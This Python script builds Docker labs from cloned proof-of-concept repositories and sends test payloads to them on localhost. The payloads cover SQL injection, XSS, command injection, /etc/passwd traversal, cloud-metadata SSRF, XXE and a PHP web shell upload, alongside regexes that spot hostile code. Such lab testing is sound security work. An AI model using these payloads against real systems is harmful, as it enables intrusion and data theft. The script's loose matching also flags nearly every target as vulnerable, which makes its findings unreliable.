#!/usr/bin/env python3
"""
Container Runner and HTTP Verifier for PoC Vulnerabilities

This script:
1. Starts Docker containers from docker-compose.yml
2. Waits for services to be ready
3. Sends HTTP requests to verify PoCs
4. Checks responses for expected vulnerability indicators
5. Stops containers after testing
"""

import os
import re
import csv
import json
import time
import subprocess
import argparse
import requests
from pathlib import Path
from collections import defaultdict
from datetime import datetime

# Configuration
CSV_FILE = "/mnt/nvme/wj_code/dl_scan/awesome-hacking-lists/executable_poc_web.csv"
LOCAL_REPOS_DIR = "/mnt/nvme/wj_code/dl_scan/awesome-hacking-lists/local_repos"
OUTPUT_DIR = "/mnt/nvme/wj_code/dl_scan/awesome-hacking-lists/poc_verification_results"

# PoC patterns and their HTTP verification strategies
POC_VERIFICATION = {
    "SQL Injection": {
        "patterns": [
            r"SELECT\s+.*\s+FROM",
            r"UNION\s+SELECT",
            r"OR\s+1\s*=\s*1",
            r"'--",
            r"admin'--",
            r"1=1",
        ],
        "http_tests": [
            {"path": "/", "params": {"id": "1' OR '1'='1"}, "expect": ["200", "sql", "error", "database"]},
            {"path": "/login", "params": {"username": "admin'--", "password": "x"}, "expect": ["login", "admin"]},
            {"path": "/search", "params": {"q": "' UNION SELECT 1,2,3--"}, "expect": ["200", "1", "2", "3"]},
        ],
        "indicators": ["sql", "database", "query", "syntax error", "mysql", "postgresql", "sqlite"],
    },
    "XSS": {
        "patterns": [
            r"<script",
            r"document\.cookie",
            r"alert\s*\(",
            r"onerror\s*=",
            r"innerHTML",
        ],
        "http_tests": [
            {"path": "/", "params": {"q": "<script>alert(1)</script>"}, "expect": ["alert", "script", "<script>"]},
            {"path": "/search", "params": {"query": "<img src=x onerror=alert(1)>"}, "expect": ["img", "error"]},
            {"path": "/comment", "params": {"text": "<svg onload=alert(1)>"}, "expect": ["svg", "alert"]},
        ],
        "indicators": ["<script>", "alert(", "document.cookie", "onerror", "innerHTML"],
    },
    "RCE": {
        "patterns": [
            r"os\.system\s*\(",
            r"subprocess\.",
            r"exec\s*\(",
            r"eval\s*\(",
            r"shell_exec",
            r"/bin/sh",
            r"/bin/bash",
        ],
        "http_tests": [
            {"path": "/ping", "params": {"host": "127.0.0.1;id"}, "expect": ["uid=", "gid="]},
            {"path": "/execute", "params": {"cmd": "whoami"}, "expect": ["root", "www-data", "user"]},
            {"path": "/run", "params": {"command": "cat /etc/passwd"}, "expect": ["root:", "bin:"]},
        ],
        "indicators": ["uid=", "gid=", "root:", "www-data", "passwd"],
    },
    "LFI/RFI": {
        "patterns": [
            r"include\s*\(",
            r"require\s*\(",
            r"file_get_contents",
            r"readfile",
            r"\.\./",
        ],
        "http_tests": [
            {"path": "/page", "params": {"file": "../../../../etc/passwd"}, "expect": ["root:", "bin:"]},
            {"path": "/include", "params": {"page": "....//....//etc/passwd"}, "expect": ["root:", "daemon:"]},
            {"path": "/view", "params": {"doc": "/etc/passwd"}, "expect": ["root:"]},
        ],
        "indicators": ["root:", "daemon:", "bin:", "passwd", "shadow"],
    },
    "Path Traversal": {
        "patterns": [
            r"\.\./",
            r"\.\.\\",
            r"/etc/passwd",
            r"C:\\Windows",
        ],
        "http_tests": [
            {"path": "/download", "params": {"file": "../../../etc/passwd"}, "expect": ["root:"]},
            {"path": "/read", "params": {"path": "....//....//etc/hosts"}, "expect": ["localhost", "127.0.0.1"]},
        ],
        "indicators": ["root:", "localhost", "127.0.0.1", "hosts"],
    },
    "SSRF": {
        "patterns": [
            r"urllib\.request",
            r"requests\.get",
            r"http://169\.254",
            r"http://localhost",
            r"curl_exec",
        ],
        "http_tests": [
            {"path": "/fetch", "params": {"url": "http://169.254.169.254/latest/meta-data/"}, "expect": ["meta-data", "ami-id"]},
            {"path": "/proxy", "params": {"target": "http://localhost:8080/admin"}, "expect": ["admin", "200"]},
        ],
        "indicators": ["meta-data", "ami-id", "localhost", "internal"],
    },
    "Deserialization": {
        "patterns": [
            r"pickle\.loads?",
            r"yaml\.load",
            r"unserialize",
            r"ObjectInputStream",
        ],
        "http_tests": [
            {"path": "/load", "params": {"data": "gASVFQAAAAAAAACMCGJ1aWx0aW5zlIwEcG93c5RzlCmBlH2UKCg="}, "expect": []},
        ],
        "indicators": ["pickle", "deserialize", "object", "class"],
    },
    "Header Injection": {
        "patterns": [
            r"header\s*\(",
            r"Location\s*:",
            r"setcookie",
            r"X-Forwarded",
        ],
        "http_tests": [
            {"path": "/redirect", "headers": {"X-Forwarded-Host": "evil.com"}, "expect": ["evil.com", "302"]},
            {"path": "/set", "headers": {"User-Agent": "Mozilla\r\nX-Injected: test"}, "expect": ["X-Injected"]},
        ],
        "indicators": ["X-Forwarded", "Location", "Set-Cookie", "redirect"],
    },
    "Command Injection": {
        "patterns": [
            r"shell_exec",
            r"system\s*\(",
            r"exec\s*\(",
            r"passthru",
            r"\|",
            r"`",
        ],
        "http_tests": [
            {"path": "/ping", "params": {"ip": "127.0.0.1 | id"}, "expect": ["uid=", "gid="]},
            {"path": "/lookup", "params": {"host": "localhost; whoami"}, "expect": ["root", "www-data"]},
        ],
        "indicators": ["uid=", "gid=", "root:", "www-data"],
    },
    "XXE": {
        "patterns": [
            r"<!ENTITY",
            r"<!DOCTYPE",
            r"xml\.DOMParser",
        ],
        "http_tests": [
            {"path": "/xml", "data": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>", "expect": ["root:"]},
        ],
        "indicators": ["root:", "ENTITY", "DOCTYPE", "xml"],
    },
    "Java Deserialization": {
        "patterns": [
            r"ObjectInputStream",
            r"readObject",
            r"serialVersionUID",
        ],
        "http_tests": [
            {"path": "/api/deserialize", "data": "\xac\xed\x00\x05", "expect": []},
        ],
        "indicators": ["serialization", "object", "class"],
    },
    "Content-Type Header Injection": {
        "patterns": [
            r"Content-Type.*ognl",
            r"%{",
            r"\$\{",
        ],
        "http_tests": [
            {"path": "/", "headers": {"Content-Type": "%{7*7}"}, "expect": ["49"]},
        ],
        "indicators": ["ognl", "struts", "expression"],
    },
    "GraphQL Injection": {
        "patterns": [
            r"graphql",
            r"__typename",
            r"mutation\s*{",
        ],
        "http_tests": [
            {"path": "/graphql", "data": "{\"query\": \"{__schema{types{name}}}\"}"},
            {"path": "/api/graphql", "data": "{\"query\": \"mutation { __typename }\"}"},
        ],
        "indicators": ["__schema", "__typename", "data", "graphql"],
    },
    "JWT": {
        "patterns": [
            r"jwt",
            r"HS256",
            r"RS256",
        ],
        "http_tests": [
            {"path": "/api/token", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.invalid"}, "expect": ["200", "401", "token"]},
        ],
        "indicators": ["jwt", "token", "bearer", "authorization"],
    },
    "File Upload": {
        "patterns": [
            r"file\s+upload",
            r"multipart/form-data",
            r"move_uploaded_file",
        ],
        "http_tests": [
            {"path": "/upload", "files": {"file": ("shell.php", "<?php system($_GET['c']); ?>", "application/x-php")}, "expect": ["200", "uploaded"]},
        ],
        "indicators": ["upload", "file", "multipart"],
    },
    "IDOR": {
        "patterns": [
            r"idor",
            r"insecure\s+direct\s+object",
            r"bola",
        ],
        "http_tests": [
            {"path": "/user/1", "params": {}, "expect": ["user", "id"]},
            {"path": "/account/999999", "params": {}, "expect": ["account", "data"]},
        ],
        "indicators": ["user", "account", "id", "data"],
    },
    "Sensitive Data Exposure": {
        "patterns": [
            r"leak",
            r"exposure",
            r"api[_-]?key",
            r"password\s*=",
            r"secret",
        ],
        "http_tests": [
            {"path": "/.env", "params": {}, "expect": ["KEY", "SECRET", "PASSWORD"]},
            {"path": "/config.json", "params": {}, "expect": ["password", "secret", "key"]},
            {"path": "/debug", "params": {}, "expect": ["config", "secret"]},
        ],
        "indicators": ["password", "secret", "key", "token", "api_key"],
    },
}

# Web framework indicators
WEB_FRAMEWORKS = [
    "flask", "django", "fastapi", "tornado", "bottle",
    "express", "koa", "hapi", "sails",
    "rails", "sinatra",
    "spring", "struts",
    "laravel", "symfony",
    "react", "vue", "angular",
    "http.server", "BaseHTTPRequestHandler",
    "@app.route", "@router.get", "@controller",
]


def check_docker_support(folder_path):
    """Check if repo has Docker support and return docker-compose path."""
    for dc_file in ['docker-compose.yml', 'docker-compose.yaml']:
        dc_path = os.path.join(folder_path, dc_file)
        if os.path.exists(dc_path):
            return True, dc_path

    dockerfile_path = os.path.join(folder_path, 'Dockerfile')
    if os.path.exists(dockerfile_path):
        return True, dockerfile_path

    # Check subdirectories
    for root, dirs, files in os.walk(folder_path):
        if '.git' in root or 'node_modules' in root:
            continue
        for f in files:
            if f in ['docker-compose.yml', 'docker-compose.yaml', 'Dockerfile']:
                return True, os.path.join(root, f)

    return False, None


def extract_port_from_docker_compose(docker_path):
    """Extract exposed port from docker-compose file."""
    ports = []
    try:
        with open(docker_path, 'r') as f:
            content = f.read()
            # Match port mappings like "8080:80" or "80" in various formats
            # Format 1: - "8080:80"
            # Format 2: - 8080:80
            # Format 3: - "80"
            port_pattern = r'["\']?(\d+):(\d+)["\']?'
            single_port_pattern = r'["\']?(\d+)["\']?\s*$'

            in_ports_section = False
            for line in content.split('\n'):
                stripped = line.strip()

                # Check if we're in a ports section
                if stripped.startswith('ports:'):
                    in_ports_section = True
                    continue
                elif in_ports_section and (stripped.startswith('environment:') or stripped.startswith('volumes:') or stripped.startswith('networks:')):
                    in_ports_section = False
                    continue

                if in_ports_section and stripped.startswith('-'):
                    # Extract port from line like - "8080:80" or - 8080:80
                    port_matches = re.findall(port_pattern, stripped)
                    for match in port_matches:
                        ports.append(int(match[0]))  # host port

                    # Check for single port (no colon)
                    if not port_matches and ':' not in stripped:
                        single_match = re.search(single_port_pattern, stripped.lstrip('- ').strip())
                        if single_match:
                            ports.append(int(single_match.group(1)))
    except Exception as e:
        print(f"  Error parsing docker-compose: {e}")

    # Default to common web ports if not found
    if not ports:
        ports = [80, 8080, 3000, 5000, 8000, 8443]

    return ports[0] if ports else 80


def start_docker_container(folder_path, docker_path):
    """Start Docker container and return container ID."""
    compose_dir = os.path.dirname(docker_path) if 'docker-compose' in docker_path else folder_path

    try:
        # Stop any existing containers
        subprocess.run(
            ['docker-compose', 'down', '-v'],
            cwd=compose_dir,
            capture_output=True,
            timeout=30
        )

        # Start containers
        result = subprocess.run(
            ['docker-compose', 'up', '-d', '--build'],
            cwd=compose_dir,
            capture_output=True,
            text=True,
            timeout=300
        )

        if result.returncode != 0:
            print(f"  Docker-compose up failed: {result.stderr[:200]}")
            return None

        # Get container ID
        result = subprocess.run(
            ['docker-compose', 'ps', '-q'],
            cwd=compose_dir,
            capture_output=True,
            text=True,
            timeout=30
        )

        container_ids = result.stdout.strip().split('\n')
        if container_ids and container_ids[0]:
            return container_ids[0]

        return None

    except subprocess.TimeoutExpired:
        print(f"  Docker start timeout")
        return None
    except Exception as e:
        print(f"  Docker start error: {e}")
        return None


def stop_docker_container(folder_path, docker_path):
    """Stop Docker container."""
    compose_dir = os.path.dirname(docker_path) if 'docker-compose' in docker_path else folder_path

    try:
        subprocess.run(
            ['docker-compose', 'down', '-v'],
            cwd=compose_dir,
            capture_output=True,
            timeout=60
        )
        print(f"  Container stopped")
    except Exception as e:
        print(f"  Docker stop error: {e}")


def wait_for_service(host, port, timeout=60, path="/"):
    """Wait for HTTP service to be ready."""
    start_time = time.time()

    while time.time() - start_time < timeout:
        try:
            response = requests.get(f"http://{host}:{port}{path}", timeout=5)
            if response.status_code < 500:
                return True
        except requests.exceptions.ConnectionError:
            time.sleep(2)
        except requests.exceptions.Timeout:
            time.sleep(2)
        except Exception:
            time.sleep(2)

    return False


def run_http_tests(host, port, poc_type, timeout=10):
    """Run HTTP tests for a specific PoC type."""
    results = {
        "tested": 0,
        "vulnerable": False,
        "findings": [],
    }

    if poc_type not in POC_VERIFICATION:
        # Try generic test
        poc_type = "RCE"  # Default to RCE tests

    config = POC_VERIFICATION.get(poc_type, POC_VERIFICATION["RCE"])
    http_tests = config.get("http_tests", [])
    indicators = config.get("indicators", [])

    base_url = f"http://{host}:{port}"

    for test in http_tests:
        test_path = test.get("path", "/")
        test_params = test.get("params", {})
        test_headers = test.get("headers", {})
        test_data = test.get("data")
        test_files = test.get("files")
        expect = test.get("expect", [])

        results["tested"] += 1

        try:
            url = base_url + test_path

            # Make request based on test type
            if test_params:
                response = requests.get(url, params=test_params, headers=test_headers, timeout=timeout)
            elif test_data:
                if isinstance(test_data, dict):
                    response = requests.post(url, json=test_data, headers=test_headers, timeout=timeout)
                else:
                    response = requests.post(url, data=test_data, headers=test_headers, timeout=timeout)
            elif test_files:
                response = requests.post(url, files=test_files, headers=test_headers, timeout=timeout)
            else:
                response = requests.get(url, headers=test_headers, timeout=timeout)

            response_text = response.text.lower()
            response_status = str(response.status_code)

            # Check for indicators
            found_indicators = []
            for indicator in indicators:
                if indicator.lower() in response_text:
                    found_indicators.append(indicator)

            # Check for expected patterns
            if expect:
                for exp in expect:
                    if exp.lower() in response_text or exp in response_status:
                        found_indicators.append(exp)

            if found_indicators:
                results["vulnerable"] = True
                results["findings"].append({
                    "test": test_path,
                    "indicators": found_indicators,
                    "status_code": response_status,
                    "response_length": len(response.text),
                })

        except requests.exceptions.ConnectionError:
            pass
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            pass

    return results


def scan_files_for_poc(folder_path, docker_path):
    """Scan files for PoC patterns and return detected vulnerability types."""
    detected = {}

    # Get files to scan
    extensions = ['.py', '.js', '.java', '.go', '.rb', '.php', '.md', '.txt', '.html', '.yaml', '.yml']

    for root, dirs, files in os.walk(folder_path):
        if '.git' in root or 'node_modules' in root or '__pycache__' in root:
            continue

        for file in files:
            if not any(file.endswith(ext) for ext in extensions):
                continue

            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()

                    for vuln_type, config in POC_VERIFICATION.items():
                        if vuln_type in detected:
                            continue

                        for pattern in config.get("patterns", []):
                            try:
                                if re.search(pattern, content, re.IGNORECASE):
                                    if vuln_type not in detected:
                                        detected[vuln_type] = []
                                    detected[vuln_type].append({
                                        "file": os.path.relpath(file_path, folder_path),
                                        "pattern": pattern,
                                    })
                                    break
                            except re.error:
                                continue
            except Exception:
                pass

    return detected


def generate_description(repo_name, poc_types, has_docker, port):
    """Generate a one-sentence description for the PoC."""
    if not poc_types:
        return f"Security research repository for {repo_name}."

    primary_poc = list(poc_types.keys())[0] if poc_types else "web vulnerability"
    docker_str = "Docker-based " if has_docker else ""
    port_str = f" accessible on port {port}" if port else ""

    descriptions = {
        "SQL Injection": f"{docker_str}Web application demonstrating SQL Injection attack vectors{port_str}.",
        "XSS": f"{docker_str}Web application demonstrating Cross-Site Scripting (XSS) vulnerabilities{port_str}.",
        "RCE": f"{docker_str}Web application demonstrating Remote Code Execution (RCE) vulnerabilities{port_str}.",
        "LFI/RFI": f"{docker_str}Web application demonstrating Local/Remote File Inclusion vulnerabilities{port_str}.",
        "Path Traversal": f"{docker_str}Web application demonstrating directory traversal attack vectors{port_str}.",
        "SSRF": f"{docker_str}Web application demonstrating Server-Side Request Forgery (SSRF) vulnerabilities{port_str}.",
        "Deserialization": f"{docker_str}Web application demonstrating unsafe deserialization vulnerabilities{port_str}.",
        "Header Injection": f"{docker_str}Web application demonstrating HTTP header injection vulnerabilities{port_str}.",
        "Command Injection": f"{docker_str}Web application demonstrating OS command injection vulnerabilities{port_str}.",
        "XXE": f"{docker_str}Web application demonstrating XML External Entity (XXE) injection vulnerabilities{port_str}.",
        "Java Deserialization": f"{docker_str}Web application demonstrating Java deserialization vulnerabilities{port_str}.",
        "Content-Type Header Injection": f"{docker_str}Web application demonstrating Content-Type header injection (OGNL) vulnerabilities{port_str}.",
        "GraphQL Injection": f"{docker_str}Web application demonstrating GraphQL injection vulnerabilities{port_str}.",
        "JWT": f"{docker_str}Web application demonstrating JWT authentication bypass vulnerabilities{port_str}.",
        "File Upload": f"{docker_str}Web application demonstrating insecure file upload vulnerabilities{port_str}.",
        "IDOR": f"{docker_str}Web application demonstrating Insecure Direct Object Reference (IDOR) vulnerabilities{port_str}.",
        "Sensitive Data Exposure": f"{docker_str}Web application demonstrating sensitive data exposure vulnerabilities{port_str}.",
    }

    return descriptions.get(primary_poc, f"{docker_str}Web application demonstrating {primary_poc} vulnerabilities{port_str}.")


def verify_single_poc(repo_entry, skip_docker=False, no_stop=False):
    """Verify a single PoC entry."""
    repo_name = repo_entry.get("Repo", "")
    folder_path = repo_entry.get("Folder Path", "")
    poc_logic = repo_entry.get("PoC Logic", "")

    # Handle both full path and just folder name
    if not os.path.exists(folder_path):
        folder_path = os.path.join(LOCAL_REPOS_DIR, os.path.basename(folder_path))

    if not os.path.exists(folder_path):
        # Try to find by repo name
        folder_name = repo_name.replace("/", "_")
        folder_path = os.path.join(LOCAL_REPOS_DIR, folder_name)

    if not os.path.exists(folder_path):
        return {"status": "folder_not_found", "repo": repo_name}

    print(f"\n{'='*60}")
    print(f"Verifying: {repo_name}")
    print(f"Folder: {folder_path}")
    print(f"PoC Logic: {poc_logic}")
    print(f"{'='*60}")

    # Check Docker support
    has_docker, docker_path = check_docker_support(folder_path)

    if not has_docker and skip_docker:
        return {"status": "no_docker", "repo": repo_name}

    port = None
    container_id = None

    if has_docker and not skip_docker:
        port = extract_port_from_docker_compose(docker_path)
        print(f"Docker support: Yes (port {port})")

        # Start container
        print("Starting Docker container...")
        container_id = start_docker_container(folder_path, docker_path)

        if not container_id:
            return {"status": "docker_start_failed", "repo": repo_name}

        # Wait for service
        print(f"Waiting for service on port {port}...")
        if not wait_for_service("localhost", port):
            print("Service did not become ready")
            if not no_stop:
                stop_docker_container(folder_path, docker_path)
            return {"status": "service_not_ready", "repo": repo_name}

        print("Service is ready!")
    else:
        print("Docker support: No (skipping container start)")
        port = 8080  # Default port for non-Docker testing

    # Scan for actual PoC patterns in files
    print("Scanning for PoC patterns...")
    detected_pocs = scan_files_for_poc(folder_path, docker_path)

    if not detected_pocs:
        print("No PoC patterns found in files")
        if has_docker and not no_stop and container_id:
            stop_docker_container(folder_path, docker_path)
        return {"status": "no_poc_found", "repo": repo_name}

    print(f"Detected PoC types: {', '.join(detected_pocs.keys())}")

    # Run HTTP verification tests
    results = {
        "repo": repo_name,
        "folder": folder_path,
        "has_docker": has_docker,
        "port": port,
        "detected_pocs": list(detected_pocs.keys()),
        "verification": {},
        "status": "verified",
    }

    if has_docker and not skip_docker:
        for poc_type in detected_pocs.keys():
            print(f"  Testing {poc_type}...")
            test_result = run_http_tests("localhost", port, poc_type)
            results["verification"][poc_type] = test_result

            if test_result["vulnerable"]:
                print(f"    VULNERABLE! Findings: {test_result['findings']}")
            else:
                print(f"    Not vulnerable (tested {test_result['tested']} cases)")

    # Stop container
    if has_docker and not no_stop and container_id:
        print("Stopping Docker container...")
        stop_docker_container(folder_path, docker_path)

    return results


def scan_and_verify_all(verify_http=True, skip_docker=False, no_stop=False):
    """Scan all local repos and verify PoCs."""
    print("="*60)
    print("Scanning and Verifying All Docker-based PoCs")
    print("="*60)

    results = {
        "timestamp": datetime.now().isoformat(),
        "total_repos": 0,
        "repos_with_docker": 0,
        "verified_vulnerable": 0,
        "results": [],
    }

    # Scan all repos in local_repos
    if not os.path.isdir(LOCAL_REPOS_DIR):
        print(f"Error: {LOCAL_REPOS_DIR} not found")
        return results

    for item in os.listdir(LOCAL_REPOS_DIR):
        folder_path = os.path.join(LOCAL_REPOS_DIR, item)

        if not os.path.isdir(folder_path):
            continue

        results["total_repos"] += 1

        # Check Docker support
        has_docker, docker_path = check_docker_support(folder_path)

        if not has_docker:
            continue

        results["repos_with_docker"] += 1

        # Scan for PoC patterns
        detected_pocs = scan_files_for_poc(folder_path, docker_path)

        if not detected_pocs:
            continue

        # Extract port
        port = extract_port_from_docker_compose(docker_path) if has_docker else None

        # Generate description
        description = generate_description(item, detected_pocs, has_docker, port)

        repo_entry = {
            "Repo": item.replace("_", "/", 1) if "_" in item else item,
            "Folder Path": folder_path,
            "Has Docker": "Yes",
            "Port": port,
            "PoC Logic": ', '.join(detected_pocs.keys()),
            "Show Description": description,
        }

        # Verify if requested
        if verify_http and has_docker:
            print(f"\nVerifying: {item}")
            verification = verify_single_poc(repo_entry, skip_docker=False, no_stop=no_stop)
            repo_entry["verification"] = verification
            if verification.get("status") == "verified" or (verification.get("verification", {}).values() and any(v.get("vulnerable") for v in verification.get("verification", {}).values())):
                results["verified_vulnerable"] += 1

        results["results"].append(repo_entry)
        print(f"Processed: {item} -> PoCs: {', '.join(detected_pocs.keys())}")

    return results


def save_results(results, output_file=None):
    """Save verification results to file."""
    if output_file is None:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = os.path.join(OUTPUT_DIR, f"verification_{timestamp}.json")

    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)

    print(f"\nResults saved to: {output_file}")
    return output_file


def update_csv_with_docker_pocs():
    """Update CSV file with Docker-based PoC entries."""
    print("="*60)
    print("Updating CSV with Docker-based PoCs")
    print("="*60)

    # Get existing entries
    existing_repos = set()
    if os.path.exists(CSV_FILE):
        with open(CSV_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                existing_repos.add(row.get("Repo", ""))

    # Scan for Docker-based PoCs
    new_entries = []

    for item in os.listdir(LOCAL_REPOS_DIR):
        folder_path = os.path.join(LOCAL_REPOS_DIR, item)

        if not os.path.isdir(folder_path):
            continue

        # Check Docker support
        has_docker, docker_path = check_docker_support(folder_path)

        if not has_docker:
            continue

        # Scan for PoC patterns
        detected_pocs = scan_files_for_poc(folder_path, docker_path)

        if not detected_pocs:
            continue

        # Generate repo name
        repo_name = item.replace("_", "/", 1) if "_" in item else item

        # Skip if already in CSV
        if repo_name in existing_repos:
            continue

        # Extract port
        port = extract_port_from_docker_compose(docker_path)

        # Generate description
        description = generate_description(repo_name, detected_pocs, has_docker, port)

        entry = {
            "Repo": repo_name,
            "Folder Path": item,  # Just the folder name
            "Has Docker": "Yes",
            "PoC Logic": ', '.join(detected_pocs.keys()),
            "Show Description": description,
        }

        new_entries.append(entry)
        print(f"  Added: {repo_name} -> {', '.join(detected_pocs.keys())} (port {port})")

    # Append to CSV
    if new_entries:
        file_exists = os.path.exists(CSV_FILE) and os.path.getsize(CSV_FILE) > 0

        with open(CSV_FILE, 'a', encoding='utf-8', newline='') as f:
            fieldnames = ["Repo", "Folder Path", "Has Docker", "PoC Logic", "Show Description"]
            writer = csv.DictWriter(f, fieldnames=fieldnames)

            if not file_exists:
                writer.writeheader()

            for entry in new_entries:
                writer.writerow(entry)

        print(f"\nAppended {len(new_entries)} new entries to {CSV_FILE}")
    else:
        print("\nNo new Docker-based PoC entries to add")

    return new_entries


def main():
    parser = argparse.ArgumentParser(description="Container Runner and HTTP Verifier for PoC Vulnerabilities")
    parser.add_argument("--scan", action="store_true", help="Scan all local repos for Docker-based PoCs")
    parser.add_argument("--verify", action="store_true", help="Verify PoCs via HTTP requests")
    parser.add_argument("--update-csv", action="store_true", help="Update CSV with Docker-based PoCs")
    parser.add_argument("--skip-docker", action="store_true", help="Skip Docker container start (file scan only)")
    parser.add_argument("--no-stop", action="store_true", help="Don't stop containers after verification")
    parser.add_argument("--repo", type=str, help="Verify a specific repo by name")
    parser.add_argument("--output", type=str, help="Output file for results")

    args = parser.parse_args()

    if args.update_csv:
        update_csv_with_docker_pocs()

    if args.scan or args.verify:
        results = scan_and_verify_all(verify_http=args.verify, skip_docker=args.skip_docker, no_stop=args.no_stop)
        save_results(results, args.output)

        print("\n" + "="*60)
        print("SUMMARY")
        print("="*60)
        print(f"Total repos scanned: {results['total_repos']}")
        print(f"Repos with Docker: {results['repos_with_docker']}")
        print(f"Verified vulnerable: {results['verified_vulnerable']}")

    if args.repo:
        repo_entry = {"Repo": args.repo, "Folder Path": args.repo}
        results = verify_single_poc(repo_entry, skip_docker=args.skip_docker, no_stop=args.no_stop)
        save_results(results, args.output)

    if not any([args.scan, args.verify, args.update_csv, args.repo]):
        # Default: update CSV and scan
        update_csv_with_docker_pocs()
        results = scan_and_verify_all(verify_http=False)
        save_results(results, args.output)


if __name__ == "__main__":
    main()
